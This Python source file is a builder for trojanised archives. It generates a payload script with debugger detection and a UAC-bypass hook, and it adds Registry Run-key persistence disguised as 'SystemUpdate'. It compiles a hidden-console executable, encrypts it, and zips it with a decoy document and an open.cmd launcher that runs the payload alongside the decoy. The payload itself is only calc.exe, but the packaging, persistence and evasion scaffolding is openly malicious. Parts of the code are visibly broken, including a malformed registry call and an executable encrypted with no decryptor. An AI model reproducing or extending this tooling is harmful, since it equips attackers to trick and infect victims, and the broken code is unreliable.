import os
import sys
import shutil
import zipfile
import subprocess
import tempfile
import base64
from cryptography.fernet import Fernet

class PayloadConfig:
    """Configuration for payload generation"""
    def __init__(self):
        self.encrypt = True
        self.sign = False
        self.evasion_techniques = []
        self.persistence_methods = []
        self.decoy_extension = '.pdf'
        self.icon = None

class PayloadGenerator:
    def __init__(self, config=PayloadConfig()):
        self.config = config
        self.temp_dir = tempfile.mkdtemp()

    def _generate_payload_script(self):
        """Generate payload script with security bypasses"""
        script = f'''# -*- coding: utf-8 -*-
import os
import sys
import ctypes
import hashlib
import platform

def check_debugger():
    try:
        return ctypes.windll.kernel32.IsDebuggerPresent()
    except:
        return False

def check_vm():
    # Add VM detection checks
    return False

def bypass_uac():
    # Add UAC bypass implementation
    pass

def main():
    # Security evasion checks
    if check_debugger() or check_vm():
        sys.exit(0)
    
    # Persistence mechanisms
    {self._add_persistence()}
    
    # Main payload
    os.system("calc.exe")

if __name__ == "__main__":
    bypass_uac()
    main()
'''
        return script

    def _add_persistence(self):
        """Add persistence code based on configuration"""
        if not self.config.persistence_methods:
            return "pass"
        
        persistence_code = []
        if 'registry' in self.config.persistence_methods:
            persistence_code.append('''# Registry persistence
ctypes.windll.advapi32.RegSetValueExW(
    ctypes.windll.advapi32.RegCreateKeyExW(
        0x80000002, "Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Run",
        0, None, 0, 0x0F003F, None
    )[0],
    "SystemUpdate", 0, 1, sys.argv[0], len(sys.argv[0])*2
''')
        return '\n'.join(persistence_code)

    def _build_executable(self, script_path, output_path):
        """Build executable using PyInstaller"""
        cmd = [
            'pyinstaller',
            '--onefile',
            '--noconsole',
            '--name', os.path.basename(output_path),
            script_path
        ]
        if self.config.icon:
            cmd.extend(['--icon', self.config.icon])
        
        subprocess.run(cmd, check=True)
        return output_path

    def _encrypt_payload(self, payload_path):
        """Encrypt payload using Fernet symmetric encryption"""
        key = Fernet.generate_key()
        cipher = Fernet(key)
        
        with open(payload_path, 'rb') as f:
            encrypted_data = cipher.encrypt(f.read())
        
        with open(payload_path, 'wb') as f:
            f.write(encrypted_data)
        
        return key.decode()

    def generate(self, output_file):
        """Main generation method"""
        try:
            # Generate payload script
            script = self._generate_payload_script()
            script_path = os.path.join(self.temp_dir, 'payload.py')
            
            with open(script_path, 'w') as f:
                f.write(script)
            
            # Build executable
            exe_path = self._build_executable(
                script_path,
                os.path.join('dist', 'payload.exe')
            )
            
            # Encrypt if configured
            if self.config.encrypt:
                encryption_key = self._encrypt_payload(exe_path)
                print(f"Encryption key: {encryption_key}")
            
            # Package with decoy
            self._package_with_decoy(exe_path, output_file)
            
            return output_file
            
        finally:
            shutil.rmtree(self.temp_dir)

    def _package_with_decoy(self, payload_path, output_file):
        """Package payload with decoy document"""
        with zipfile.ZipFile(output_file, 'w') as zf:
            # Add decoy document
            decoy_content = b'This is a decoy document'
            zf.writestr(f'document{self.config.decoy_extension}', decoy_content)
            
            # Add payload
            zf.write(payload_path, 'payload.exe')
            
            # Add loader script
            loader_script = f'''
@echo off
start /B payload.exe
start document{self.config.decoy_extension}
'''
            zf.writestr('open.cmd', loader_script)

if __name__ == "__main__":
    # Example configuration
    config = PayloadConfig()
    config.persistence_methods = ['registry']
    config.evasion_techniques = ['debugger_check', 'vm_detection']
    config.decoy_extension = '.docx'
    
    generator = PayloadGenerator(config)
    generator.generate('malicious_package.zip')